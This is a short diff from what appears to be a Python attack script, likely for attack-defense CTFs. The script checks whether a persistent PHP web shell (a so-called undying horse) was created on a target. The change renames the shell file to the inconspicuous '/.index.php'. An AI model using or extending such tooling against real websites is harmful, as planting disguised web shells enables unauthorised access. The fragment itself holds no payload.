@@ -120,7 +120,7 @@ def upload(url,method,passwd):
 	except :
 		pass
 	#尝试访问不死马生成的shell
-	shell_url = b_url+"/.fuckyou.php"
+	shell_url = b_url+"/.index.php"
 	res = requests.get(shell_url)
 	if res.status_code!=200 :
 		print "[-] %s create shell failed!" %bsm_url
